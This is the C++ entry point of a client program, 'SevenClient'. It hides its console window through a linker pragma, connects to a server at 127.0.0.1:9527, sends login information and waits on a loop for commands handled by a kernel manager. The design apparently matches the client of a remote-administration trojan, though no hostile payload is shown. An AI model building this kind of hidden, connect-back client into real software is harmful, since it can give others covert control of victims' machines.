// SevenClient.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "ClientSocket.h"
#include "loop.h"
#include "KernelManager.h"
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )

int main()
{
	//printf("start client");
	wchar_t *ServerIp;
	int      ServerPort;
	ServerIp = _T("127.0.0.1");
	ServerPort = 9527;
	HANDLE	hEvent = NULL;

	CClientSocket socketClient;
	DWORD	dwIOCPEvent;


	socketClient.Connect(ServerIp,ServerPort);
	CKernelManager manager(&socketClient,ServerIp,ServerPort);
	manager.sendLoginInfo();
	socketClient.setManagerCallBack(&manager);
	Sleep(1000);
	
	do
	{
		hEvent = OpenEvent(EVENT_ALL_ACCESS, false, NULL);
		dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
		Sleep(500);
	} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

	if (hEvent != NULL)
	{
		socketClient.Disconnect();
		CloseHandle(hEvent);
	}


	//system("pause");
	return 0;
}

